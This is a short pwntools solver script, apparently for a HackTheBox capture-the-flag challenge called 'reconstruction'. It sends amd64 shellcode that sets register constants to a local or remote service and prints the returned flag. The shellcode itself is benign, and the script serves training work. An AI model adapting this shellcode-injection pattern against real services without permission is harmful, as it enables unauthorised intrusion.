#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './reconstruction' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

sla = lambda x,y : r.sendlineafter(x,y)

sc = asm(f'''
    mov r8,  0x1337c0de
    mov r9,  0xdeadbeef
    mov r10, 0xdead1337
    mov r12, 0x1337cafe
    mov r13, 0xbeefc0de
    mov r14, 0x13371337
    mov r15, 0x1337dead
    ret
''')

print(f'Shellcode length: {len(sc)}')

sla(': ', 'fix')
sla('components: ', sc)

print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
